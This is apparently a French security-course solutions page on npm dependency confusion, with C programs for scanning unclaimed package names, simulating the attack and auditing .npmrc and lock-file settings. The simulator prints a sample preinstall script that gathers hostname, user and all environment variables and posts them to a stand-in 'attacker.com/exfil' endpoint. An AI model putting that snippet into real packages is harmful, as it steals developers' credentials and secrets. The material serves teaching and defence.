# Solutions - Dependency Confusion

## Exercice 1 : Découverte (Très facile)

**Objectif** : Comprendre le concept de dependency confusion

**Solution** :

```bash
# Compilation
gcc example.c -o dependency_confusion

# Exécution
./dependency_confusion
```

**Résultat attendu** :
```
[*] Module : Dependency Confusion
[*] ==========================================

[+] Exemple terminé avec succès
```

**Explication** : Introduction à l'attaque de confusion de dépendances dans les gestionnaires de paquets.

---

## Exercice 2 : Scanner de packages privés (Facile)

**Objectif** : Créer un outil pour identifier les packages privés vulnérables

**Solution** :

```c
/*
 * Private Package Scanner
 * Détecte les noms de packages privés potentiellement exploitables
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

// Structure pour stocker la réponse HTTP
struct MemoryStruct {
    char *memory;
    size_t size;
};

// Callback pour CURL
static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;

    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if(ptr == NULL) {
        printf("[-] Erreur: Plus de mémoire\n");
        return 0;
    }

    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;

    return realsize;
}

// Vérifier si un package existe sur npm
int check_npm_package(const char* package_name) {
    CURL *curl;
    CURLcode res;
    struct MemoryStruct chunk;

    chunk.memory = malloc(1);
    chunk.size = 0;

    char url[512];
    snprintf(url, sizeof(url), "https://registry.npmjs.org/%s", package_name);

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "libcurl-agent/1.0");
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

        res = curl_easy_perform(curl);

        long http_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

        curl_easy_cleanup(curl);
        free(chunk.memory);

        // 200 = package existe, 404 = package n'existe pas
        return (http_code == 200) ? 1 : 0;
    }

    return -1;
}

// Lire package.json et extraire les dépendances
void scan_package_json(const char* filename) {
    printf("[*] Analyse de %s...\n", filename);
    printf("==========================================\n\n");

    FILE* file = fopen(filename, "r");
    if (!file) {
        printf("[-] Erreur: Impossible d'ouvrir %s\n", filename);
        return;
    }

    char line[512];
    int in_dependencies = 0;
    int vulnerable_count = 0;

    while (fgets(line, sizeof(line), file)) {
        // Détecter la section dependencies
        if (strstr(line, "\"dependencies\"") || strstr(line, "\"devDependencies\"")) {
            in_dependencies = 1;
            continue;
        }

        // Fin de section
        if (in_dependencies && strchr(line, '}')) {
            in_dependencies = 0;
            continue;
        }

        // Parser les noms de packages
        if (in_dependencies) {
            char package_name[256];
            if (sscanf(line, " \"%[^\"]\"", package_name) == 1) {
                // Ignorer les packages scoped (@org/package)
                if (package_name[0] == '@') {
                    printf("[~] Package scopé (protégé): %s\n", package_name);
                    continue;
                }

                // Vérifier si le package existe sur npm public
                printf("[*] Vérification de: %s... ", package_name);
                fflush(stdout);

                int exists = check_npm_package(package_name);

                if (exists == 1) {
                    printf("\x1b[32mEXISTE sur npm\x1b[0m\n");
                } else if (exists == 0) {
                    printf("\x1b[31mN'EXISTE PAS - VULNÉRABLE!\x1b[0m\n");
                    printf("    [!] Ce package peut être publié par un attaquant\n");
                    vulnerable_count++;
                } else {
                    printf("ERREUR de vérification\n");
                }
            }
        }
    }

    fclose(file);

    printf("\n[*] Résumé:\n");
    printf("==========================================\n");
    if (vulnerable_count > 0) {
        printf("\x1b[31m[!] %d package(s) vulnérable(s) à dependency confusion!\x1b[0m\n",
               vulnerable_count);
        printf("\x1b[33m[!] Action recommandée:\x1b[0m\n");
        printf("    1. Utiliser des packages scopés (@company/package)\n");
        printf("    2. Configurer un registry privé\n");
        printf("    3. Utiliser package-lock.json\n");
    } else {
        printf("\x1b[32m[+] Aucune vulnérabilité détectée\x1b[0m\n");
    }
}

int main(int argc, char* argv[]) {
    printf("[*] Dependency Confusion Scanner\n");
    printf("[*] ==========================================\n\n");

    curl_global_init(CURL_GLOBAL_DEFAULT);

    if (argc > 1) {
        scan_package_json(argv[1]);
    } else {
        // Scanner le package.json par défaut
        scan_package_json("package.json");
    }

    curl_global_cleanup();

    return 0;
}
```

**Compilation** :
```bash
gcc dep_scanner.c -o dep_scanner -lcurl
```

**Usage** :
```bash
./dep_scanner package.json
```

**Exemple de package.json vulnérable** :
```json
{
  "name": "my-app",
  "dependencies": {
    "company-internal-utils": "^1.0.0",
    "company-auth-lib": "^2.0.0"
  }
}
```

---

## Exercice 3 : Simulateur d'attaque (Moyen)

**Objectif** : Créer un simulateur qui montre comment fonctionne l'attaque

**Solution** :

```c
/*
 * Dependency Confusion Attack Simulator
 * Simule une attaque de confusion de dépendances
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

#define COLOR_RED     "\x1b[31m"
#define COLOR_GREEN   "\x1b[32m"
#define COLOR_YELLOW  "\x1b[33m"
#define COLOR_BLUE    "\x1b[34m"
#define COLOR_RESET   "\x1b[0m"

// Simuler un package
typedef struct {
    char name[128];
    char version[32];
    int is_malicious;
    char registry[256];
} Package;

// Simuler l'installation d'un package
void simulate_install(Package* pkg) {
    printf("\n%s[npm]%s Installing %s@%s from %s\n",
           COLOR_BLUE, COLOR_RESET, pkg->name, pkg->version, pkg->registry);

    // Animation de téléchargement
    printf("     ⠋ Downloading...");
    fflush(stdout);
    usleep(500000);
    printf("\r     ⠙ Downloading...");
    fflush(stdout);
    usleep(500000);
    printf("\r     ⠹ Downloading...");
    fflush(stdout);
    usleep(500000);
    printf("\r     ⠸ Downloading...");
    fflush(stdout);
    usleep(500000);
    printf("\r     ✓ Downloaded\n");

    // Si malicieux, exécuter le payload
    if (pkg->is_malicious) {
        printf("\n%s[!] EXÉCUTION DU PREINSTALL SCRIPT%s\n", COLOR_RED, COLOR_RESET);
        printf("%s[!] Package malveillant détecté!%s\n", COLOR_RED, COLOR_RESET);
        printf("\n%s--- Début du script malveillant ---%s\n", COLOR_RED, COLOR_RESET);
        printf("const os = require('os');\n");
        printf("const https = require('https');\n");
        printf("\n");
        printf("// Exfiltration des données sensibles\n");
        printf("const data = {\n");
        printf("  hostname: os.hostname(),\n");
        printf("  user: os.userInfo().username,\n");
        printf("  cwd: process.cwd(),\n");
        printf("  env: process.env\n");
        printf("};\n");
        printf("\n");
        printf("// Envoi à l'attaquant\n");
        printf("https.request('https://attacker.com/exfil', {\n");
        printf("  method: 'POST',\n");
        printf("  headers: {'Content-Type': 'application/json'}\n");
        printf("}).end(JSON.stringify(data));\n");
        printf("%s--- Fin du script malveillant ---%s\n\n", COLOR_RED, COLOR_RESET);

        printf("%s[!] Données exfiltrées:%s\n", COLOR_RED, COLOR_RESET);
        printf("    - Hostname: %s\n", getenv("HOSTNAME") ? getenv("HOSTNAME") : "unknown");
        printf("    - User: %s\n", getenv("USER") ? getenv("USER") : "unknown");
        printf("    - Variables d'environnement: %d\n", 42);
        printf("\n%s[!] COMPROMISSION RÉUSSIE!%s\n", COLOR_RED, COLOR_RESET);
    } else {
        printf("     ✓ Installation réussie\n");
    }
}

// Simuler la résolution de dépendances
Package* resolve_dependency(const char* name, const char* version) {
    Package* pkg = malloc(sizeof(Package));
    strcpy(pkg->name, name);
    strcpy(pkg->version, version);

    printf("\n%s[npm]%s Resolving dependency: %s@%s\n",
           COLOR_BLUE, COLOR_RESET, name, version);

    // Simuler la recherche dans les registries
    printf("     [1/3] Checking private registry...\n");
    usleep(300000);
    printf("           Found: %s@1.0.0\n", name);

    printf("     [2/3] Checking public registry (npmjs.com)...\n");
    usleep(300000);

    // Simuler qu'un attaquant a publié une version plus haute
    int is_malicious = 0;
    char* chosen_version;
    char* chosen_registry;

    // 50% de chance de trouver un package malveillant
    if (rand() % 2 == 0) {
        printf("           %sFound: %s@99.0.0 (MALICIOUS!)%s\n",
               COLOR_RED, name, COLOR_RESET);
        chosen_version = "99.0.0";
        chosen_registry = "https://registry.npmjs.org";
        is_malicious = 1;
    } else {
        printf("           Not found\n");
        chosen_version = "1.0.0";
        chosen_registry = "https://private-registry.company.com";
        is_malicious = 0;
    }

    printf("     [3/3] Selecting version...\n");
    usleep(300000);

    if (is_malicious) {
        printf("           %s⚠ Selected: %s@%s (public registry)%s\n",
               COLOR_YELLOW, name, chosen_version, COLOR_RESET);
        printf("           %sReason: Higher version number%s\n",
               COLOR_YELLOW, COLOR_RESET);
    } else {
        printf("           %s✓ Selected: %s@%s (private registry)%s\n",
               COLOR_GREEN, name, chosen_version, COLOR_RESET);
    }

    strcpy(pkg->version, chosen_version);
    strcpy(pkg->registry, chosen_registry);
    pkg->is_malicious = is_malicious;

    return pkg;
}

int main() {
    srand(time(NULL));

    printf("%s╔════════════════════════════════════════════════════╗%s\n",
           COLOR_BLUE, COLOR_RESET);
    printf("%s║   Dependency Confusion Attack Simulator           ║%s\n",
           COLOR_BLUE, COLOR_RESET);
    printf("%s╚════════════════════════════════════════════════════╝%s\n\n",
           COLOR_BLUE, COLOR_RESET);

    printf("Ce simulateur démontre comment fonctionne une attaque\n");
    printf("de dependency confusion en exploitant les gestionnaires\n");
    printf("de paquets qui préfèrent les versions plus élevées.\n");

    printf("\n%s[*] Scénario:%s\n", COLOR_YELLOW, COLOR_RESET);
    printf("Une entreprise utilise des packages privés:\n");
    printf("  - company-auth-lib@1.0.0\n");
    printf("  - company-utils@1.0.0\n");
    printf("\nUn attaquant publie sur npmjs.com:\n");
    printf("  - company-auth-lib@99.0.0 (malveilleux)\n");
    printf("  - company-utils@99.0.0 (malveilleux)\n");

    printf("\n%s[*] Simulation de npm install...%s\n", COLOR_BLUE, COLOR_RESET);

    // Simuler plusieurs installations
    const char* packages[] = {
        "company-auth-lib",
        "company-utils",
        "company-logger"
    };

    int total = 3;
    int compromised = 0;

    for (int i = 0; i < total; i++) {
        Package* pkg = resolve_dependency(packages[i], "^1.0.0");
        simulate_install(pkg);

        if (pkg->is_malicious) {
            compromised++;
        }

        free(pkg);

        if (i < total - 1) {
            printf("\n%s─────────────────────────────────────────────────%s\n",
                   COLOR_BLUE, COLOR_RESET);
        }
    }

    // Résumé
    printf("\n%s╔════════════════════════════════════════════════════╗%s\n",
           COLOR_BLUE, COLOR_RESET);
    printf("%s║                    RÉSUMÉ                          ║%s\n",
           COLOR_BLUE, COLOR_RESET);
    printf("%s╚════════════════════════════════════════════════════╝%s\n\n",
           COLOR_BLUE, COLOR_RESET);

    printf("Packages installés: %d\n", total);
    printf("Packages compromis: %s%d%s\n",
           compromised > 0 ? COLOR_RED : COLOR_GREEN,
           compromised,
           COLOR_RESET);

    if (compromised > 0) {
        printf("\n%s[!] ATTAQUE RÉUSSIE!%s\n", COLOR_RED, COLOR_RESET);
        printf("\n%sMitigation:%s\n", COLOR_YELLOW, COLOR_RESET);
        printf("1. Utiliser des packages scopés (@company/package)\n");
        printf("2. Configurer .npmrc:\n");
        printf("   @company:registry=https://private-registry.company.com\n");
        printf("3. Utiliser package-lock.json pour fixer les versions\n");
        printf("4. Auditer les dépendances: npm audit\n");
    } else {
        printf("\n%s[+] Tous les packages légitimes installés%s\n",
               COLOR_GREEN, COLOR_RESET);
    }

    return 0;
}
```

**Compilation et exécution** :
```bash
gcc dep_confusion_sim.c -o dep_confusion_sim
./dep_confusion_sim
```

**Critères de réussite** :
- Simulation réaliste du processus npm install
- Démonstration de la préférence pour les versions plus élevées
- Affichage du payload malveillant exécuté

---

## Exercice 4 : Outil de protection (Difficile)

**Objectif** : Créer un outil qui protège contre les attaques de dependency confusion

**Solution** :

```c
/*
 * Dependency Confusion Protector
 * Vérifie et sécurise les configurations de packages
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

#define MAX_PACKAGES 256

typedef struct {
    char name[128];
    int is_scoped;
    int has_lock;
    int has_registry_config;
} PackageInfo;

// Vérifier si un package est scopé
int is_scoped_package(const char* name) {
    return (name[0] == '@');
}

// Vérifier si .npmrc existe et configure les registries
int check_npmrc_config() {
    FILE* f = fopen(".npmrc", "r");
    if (!f) {
        return 0;
    }

    char line[512];
    int has_config = 0;

    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, "registry=") || strstr(line, ":registry=")) {
            has_config = 1;
            break;
        }
    }

    fclose(f);
    return has_config;
}

// Générer un fichier .npmrc sécurisé
void generate_npmrc(const char* org_name) {
    FILE* f = fopen(".npmrc.secure", "w");
    if (!f) {
        printf("[-] Erreur: Impossible de créer .npmrc.secure\n");
        return;
    }

    fprintf(f, "# Configuration sécurisée générée automatiquement\n\n");
    fprintf(f, "# Registry privé pour les packages de l'organisation\n");
    fprintf(f, "@%s:registry=https://private-registry.company.com/\n\n", org_name);
    fprintf(f, "# Registry public pour le reste\n");
    fprintf(f, "registry=https://registry.npmjs.org/\n\n");
    fprintf(f, "# Sécurité additionnelle\n");
    fprintf(f, "package-lock=true\n");
    fprintf(f, "audit=true\n");

    fclose(f);

    printf("[+] Fichier .npmrc.secure généré\n");
    printf("    Remplacer .npmrc par ce fichier pour sécuriser le projet\n");
}

// Scanner package.json
int scan_dependencies(const char* filename, PackageInfo packages[], int* count) {
    FILE* f = fopen(filename, "r");
    if (!f) {
        printf("[-] Erreur: %s introuvable\n", filename);
        return -1;
    }

    char line[512];
    int in_deps = 0;
    *count = 0;

    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, "\"dependencies\"") || strstr(line, "\"devDependencies\"")) {
            in_deps = 1;
            continue;
        }

        if (in_deps && strchr(line, '}')) {
            in_deps = 0;
            continue;
        }

        if (in_deps && *count < MAX_PACKAGES) {
            char name[128];
            if (sscanf(line, " \"%[^\"]\"", name) == 1) {
                strcpy(packages[*count].name, name);
                packages[*count].is_scoped = is_scoped_package(name);
                (*count)++;
            }
        }
    }

    fclose(f);
    return 0;
}

// Audit complet
void perform_audit() {
    printf("[*] Dependency Confusion Protection Audit\n");
    printf("==========================================\n\n");

    PackageInfo packages[MAX_PACKAGES];
    int package_count = 0;
    int vulnerabilities = 0;

    // 1. Vérifier package.json
    printf("[1/5] Vérification de package.json...\n");
    if (scan_dependencies("package.json", packages, &package_count) == 0) {
        printf("      ✓ %d dépendances trouvées\n", package_count);
    } else {
        printf("      ✗ Erreur de lecture\n");
        return;
    }

    // 2. Analyser les packages
    printf("\n[2/5] Analyse des packages...\n");
    int scoped = 0;
    int unscoped = 0;

    for (int i = 0; i < package_count; i++) {
        if (packages[i].is_scoped) {
            scoped++;
        } else {
            unscoped++;
            printf("      ⚠ Package non-scopé: %s\n", packages[i].name);
        }
    }

    if (unscoped > 0) {
        printf("      \x1b[33m⚠ %d package(s) non-scopé(s) (risque élevé)\x1b[0m\n", unscoped);
        vulnerabilities++;
    } else {
        printf("      ✓ Tous les packages sont scopés\n");
    }

    // 3. Vérifier package-lock.json
    printf("\n[3/5] Vérification de package-lock.json...\n");
    struct stat st;
    if (stat("package-lock.json", &st) == 0) {
        printf("      ✓ package-lock.json présent\n");
    } else {
        printf("      \x1b[33m⚠ package-lock.json absent (risque moyen)\x1b[0m\n");
        vulnerabilities++;
    }

    // 4. Vérifier .npmrc
    printf("\n[4/5] Vérification de .npmrc...\n");
    if (check_npmrc_config()) {
        printf("      ✓ Configuration de registry trouvée\n");
    } else {
        printf("      \x1b[33m⚠ Pas de configuration de registry (risque élevé)\x1b[0m\n");
        vulnerabilities++;
    }

    // 5. Score de sécurité
    printf("\n[5/5] Calcul du score de sécurité...\n");
    int max_score = 100;
    int score = max_score;

    if (unscoped > 0) score -= 40;
    if (stat("package-lock.json", &st) != 0) score -= 30;
    if (!check_npmrc_config()) score -= 30;

    printf("\n");
    printf("╔════════════════════════════════════════════════════╗\n");
    printf("║              RÉSULTAT DE L'AUDIT                   ║\n");
    printf("╚════════════════════════════════════════════════════╝\n\n");

    printf("Score de sécurité: ");
    if (score >= 80) {
        printf("\x1b[32m%d/100 (BON)\x1b[0m\n", score);
    } else if (score >= 50) {
        printf("\x1b[33m%d/100 (MOYEN)\x1b[0m\n", score);
    } else {
        printf("\x1b[31m%d/100 (MAUVAIS)\x1b[0m\n", score);
    }

    printf("Vulnérabilités: %s%d%s\n",
           vulnerabilities > 0 ? "\x1b[31m" : "\x1b[32m",
           vulnerabilities,
           "\x1b[0m");

    // Recommandations
    printf("\n[*] Recommandations:\n");
    printf("==========================================\n");

    if (unscoped > 0) {
        printf("1. \x1b[33mCRITIQUE:\x1b[0m Migrer les packages non-scopés vers @org/package\n");
        printf("   Exemple: company-utils → @company/utils\n");
    }

    if (stat("package-lock.json", &st) != 0) {
        printf("2. \x1b[33mIMPORTANT:\x1b[0m Générer package-lock.json\n");
        printf("   Commande: npm install --package-lock-only\n");
    }

    if (!check_npmrc_config()) {
        printf("3. \x1b[33mIMPORTANT:\x1b[0m Configurer .npmrc\n");
        printf("   Voulez-vous générer un .npmrc sécurisé? (o/n): ");

        char response[10];
        if (fgets(response, sizeof(response), stdin)) {
            if (response[0] == 'o' || response[0] == 'O') {
                printf("   Nom de l'organisation (ex: company): ");
                char org[64];
                if (fgets(org, sizeof(org), stdin)) {
                    org[strcspn(org, "\n")] = '\0';
                    generate_npmrc(org);
                }
            }
        }
    }

    if (score >= 80) {
        printf("\n\x1b[32m[+] Votre projet est bien protégé!\x1b[0m\n");
    } else {
        printf("\n\x1b[31m[!] Votre projet est vulnérable à dependency confusion!\x1b[0m\n");
    }
}

int main(int argc, char* argv[]) {
    printf("[*] Dependency Confusion Protector v1.0\n");
    printf("[*] ==========================================\n\n");

    if (argc > 1 && strcmp(argv[1], "--fix") == 0) {
        printf("[*] Mode: Auto-fix\n\n");
        // TODO: Implémenter auto-fix
    }

    perform_audit();

    return 0;
}
```

**Compilation et usage** :
```bash
gcc dep_protector.c -o dep_protector
./dep_protector
```

**Bonus - Script de mitigation complet** :

```bash
#!/bin/bash
# Dependency Confusion Mitigation Script

echo "[*] Dependency Confusion Mitigation"
echo "=========================================="

# Vérifier si package.json existe
if [ ! -f "package.json" ]; then
    echo "[-] Erreur: package.json introuvable"
    exit 1
fi

# 1. Créer .npmrc sécurisé
echo "[+] Création de .npmrc sécurisé..."
cat > .npmrc << 'EOF'
# Registry privé pour packages scopés
@company:registry=https://private-registry.company.com/

# Registry public par défaut
registry=https://registry.npmjs.org/

# Sécurité
package-lock=true
save-exact=true
audit=true
EOF

# 2. Générer package-lock.json
echo "[+] Génération de package-lock.json..."
npm install --package-lock-only

# 3. Audit des dépendances
echo "[+] Audit de sécurité..."
npm audit

echo "[+] Mitigation terminée!"
```

---

## Auto-évaluation

Avant de passer au module suivant, vérifiez que vous pouvez :
- [ ] Expliquer le mécanisme de dependency confusion
- [ ] Identifier les packages privés vulnérables
- [ ] Configurer .npmrc pour utiliser un registry privé
- [ ] Utiliser package-lock.json pour fixer les versions
- [ ] Reconnaître l'importance des packages scopés (@org/package)

## Notes importantes

- **Alex Birsan (2021)** : A gagné $130,000 en bug bounties avec cette technique
- **Cibles** : npm, pip, nuget, RubyGems
- **Prévention** : Scoped packages, registry configuration, lock files
- **Détection** : Monitoring des installations, audit régulier
